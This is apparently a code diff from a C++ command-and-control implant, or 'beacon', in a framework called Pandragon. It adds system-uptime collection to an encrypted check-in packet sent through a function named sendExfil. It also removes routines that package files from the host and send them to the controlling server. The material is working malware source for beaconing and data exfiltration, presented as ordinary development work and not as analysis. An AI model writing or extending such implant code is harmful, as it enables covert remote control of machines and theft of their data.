@@ -12,11 +12,6 @@
 #include <cstring>
 #include <winsock.h>
 
-// -- Request direction (for transport to select poll vs submit malleable) -
-enum class RequestDirection : uint8_t {
-    POLL,
-    SUBMIT
-};
 static RequestDirection g_request_direction = RequestDirection::POLL;
 
 void setRequestDirection(RequestDirection dir) { g_request_direction = dir; }
@@ -197,8 +192,30 @@ bool switchChannel(const wchar_t* host,
     return true;
 }
 
+// -- Helper: get system uptime in milliseconds ---------------------------
+// Uses NtQuerySystemInformation(SystemTimeOfDayInformation) to compute
+// (CurrentTime - BootTime) / 10000. Returns 0 on failure (server treats
+// 0 as unknown boot state, no reset triggered).
+static uint64_t getUptimeMs(functionTable* nt) {
+    uint8_t info[16] = {0};
+    ULONG retLen = 0;
+    NTSTATUS status = nt->NtQuerySystemInformation(
+        3, info, sizeof(info), &retLen
+    );
+    if (status != 0 || retLen < 16) {
+        c_debugPrint(nt, "[getUptimeMs] NtQuerySystemInformation failed: 0x%lx", (unsigned long)status);
+        return 0;
+    }
+    uint64_t bootTime = *(uint64_t*)info;
+    uint64_t curTime  = *(uint64_t*)(info + 8);
+    // Both are FILETIME (100ns intervals since Jan 1, 1601)
+    uint64_t diff100ns = curTime - bootTime;
+    return diff100ns / 10000ULL;
+}
+
 // -- sendCheckin -----------------------------------------------------
 // Send initial check-in with BEACON_CHECK_IN opcode
+// Payload format: [uptime_ms:8][sysinfo...]  (uptime for reboot detection)
 bool sendCheckin(const char* sysinfo, size_t sysinfo_len) {
     c_VERBOSE(g_state.nt, "[sendCheckin] ENTER: g_state.nt=%p, g_state.identity_set=%d, sysinfo=%p, sysinfo_len=%zu",
                  (void*)g_state.nt, (int)g_state.identity_set, (const void*)sysinfo, sysinfo_len);
@@ -208,7 +225,6 @@ bool sendCheckin(const char* sysinfo, size_t sysinfo_len) {
         return false;
     }
 
-
     // Generate cryptographically secure random nonce for this packet
     uint8_t nonce[24] = {0};
     if (!generateSecureNonce(g_state.nt, nonce)) {
@@ -216,12 +232,23 @@ bool sendCheckin(const char* sysinfo, size_t sysinfo_len) {
         return false;
     }
 
-    // Use sysinfo if provided, otherwise send empty payload
-    const uint8_t* payload = sysinfo ? reinterpret_cast<const uint8_t*>(sysinfo) : nullptr;
-    size_t payload_len = sysinfo_len;
+    // Query uptime for reboot detection
+    uint64_t uptime_ms = getUptimeMs(g_state.nt);
 
-    c_debugPrint(g_state.nt, "[sendCheckin] Serializing check-in packet...");
-    // Serialize the packet with encryption (with PKCS#7 padding if enabled)
+    // Build payload: [uptime_ms:8][sysinfo...]
+    size_t payload_len = sizeof(uptime_ms) + sysinfo_len;
+    uint8_t* payload = (uint8_t*)__malloc(payload_len);
+    if (!payload) {
+        c_debugPrint(g_state.nt, "[sendCheckin] malloc failed for payload\n");
+        return false;
+    }
+    __memcpy(payload, &uptime_ms, sizeof(uptime_ms));
+    if (sysinfo && sysinfo_len > 0) {
+        __memcpy(payload + sizeof(uptime_ms), sysinfo, sysinfo_len);
+    }
+
+    c_debugPrint(g_state.nt, "[sendCheckin] Serializing check-in packet (uptime=%llu)...",
+                 (unsigned long long)uptime_ms);
     PandragonRuntime& runtime = PandragonRuntime::getInstance();
     auto packet_result = pandragon::serializePacket(
         g_state.beacon_id,
@@ -235,12 +262,12 @@ bool sendCheckin(const char* sysinfo, size_t sysinfo_len) {
         runtime.getConfig().pad_max
     );
 
+    __free(payload);
+
     if (packet_result.first == pandragon::parse_err::OK) {
         c_VERBOSE(g_state.nt, "[sendCheckin] Packet serialized: %zu bytes, sending via sendExfil...", packet_result.second.second);
-        // Send the complete packet to configured check-in endpoint
         bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
         c_VERBOSE(g_state.nt, "[sendCheckin] sendExfil returned: %d", (int)result);
-        // Clean up allocated packet buffer
         __free(packet_result.second.first);
         return result;
     }
@@ -888,116 +915,6 @@ bool sendExfil(const void* content, size_t contentLen, const wchar_t* targetPath
     bool ok = (res.first != nullptr && res.second > 0);
     if (res.first) __free(res.first);
     return ok;
-}
-
-/* ---------------------------------------------------------------------------
- * Send file content response to server (FILE_CONTENT opcode).
- * Uses payload_file_content struct for proper memory layout.
- * --------------------------------------------------------------------------- */
-bool pandragon::sendFileContent(const wchar_t* filePath, const uint8_t* fileData, size_t fileSize, uint8_t status) {
-    if (!g_state.nt || !filePath) return false;
-    
-    // Calculate path length in wchar_t (not bytes)
-    size_t pathLen = 0;
-    while (filePath[pathLen] && pathLen < 255) pathLen++;
-    
-    // Build payload using struct for proper layout
-    size_t payloadSize = sizeof(payload_file_content) + (pathLen * sizeof(wchar_t)) + fileSize;
-    payload_file_content* payload = (payload_file_content*)__malloc(payloadSize);
-    if (!payload) return false;
-    
-    // Set header fields
-    payload->path_len = (uint16_t)pathLen;
-    payload->file_size = (uint32_t)fileSize;
-    payload->status = status;
-    
-    // Copy path immediately after struct
-    wchar_t* pathBuffer = (wchar_t*)(payload + 1);
-    for (size_t i = 0; i < pathLen; i++) {
-        pathBuffer[i] = filePath[i];
-    }
-    
-    // Copy file data after path
-    if (fileData && fileSize > 0) {
-        uint8_t* dataBuffer = (uint8_t*)(pathBuffer + pathLen);
-        __memcpy(dataBuffer, fileData, fileSize);
-    }
-
-    // Generate cryptographically secure random nonce for this packet
-    uint8_t nonce[24] = {0};
-    if (!generateSecureNonce(g_state.nt, nonce)) {
-        c_debugPrint(g_state.nt, "[sendFileContent] CSPRNG failed - aborting packet\n");
-        __free(payload);
-        return false;
-    }
-
-    // Serialize with encryption
-    PandragonRuntime& runtime = PandragonRuntime::getInstance();
-    auto packet_result = pandragon::serializePacket(
-        g_state.beacon_id,
-        pandragon::b2s_opcode::FILE_CONTENT,
-        getNextSeqNum(),
-        nonce,
-        reinterpret_cast<const uint8_t*>(payload),
-        payloadSize,
-        g_state.crypto_key,
-        runtime.getConfig().options.pad,
-        runtime.getConfig().pad_max
-    );
-    
-    __free(payload);
-    
-    if (packet_result.first != pandragon::parse_err::OK) {
-        return false;
-    }
-    
-    // Send via configured check-in endpoint
-    bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
-    __free(packet_result.second.first);
-    
-    return result;
-}
-
-/* ---------------------------------------------------------------------------
- * Send file write result to server (FILE_WRITE_RESULT opcode).
- * Uses payload_file_write_result struct for proper memory layout.
- * --------------------------------------------------------------------------- */
-bool pandragon::sendFileWriteResult(uint8_t status) {
-    if (!g_state.nt) return false;
-    
-    // Use struct for proper layout
-    payload_file_write_result payload;
-    payload.status = status;
-
-    // Generate cryptographically secure random nonce for this packet
-    uint8_t nonce[24] = {0};
-    if (!generateSecureNonce(g_state.nt, nonce)) {
-        c_debugPrint(g_state.nt, "[sendFileWriteResult] CSPRNG failed - aborting packet\n");
-        return false;
-    }
-
-    // Serialize with encryption
-    PandragonRuntime& runtime = PandragonRuntime::getInstance();
-    auto packet_result = pandragon::serializePacket(
-        g_state.beacon_id,
-        pandragon::b2s_opcode::FILE_WRITE_RESULT,
-        getNextSeqNum(),
-        nonce,
-        reinterpret_cast<const uint8_t*>(&payload),
-        sizeof(payload),
-        g_state.crypto_key,
-        runtime.getConfig().options.pad,
-        runtime.getConfig().pad_max
-    );
-
-    if (packet_result.first != pandragon::parse_err::OK) {
-        return false;
-    }
-
-    bool result = sendExfil(packet_result.second.first, packet_result.second.second, g_state.submit_path);
-    __free(packet_result.second.first);
-
-    return result;
 }
 
 /* ---------------------------------------------------------------------------
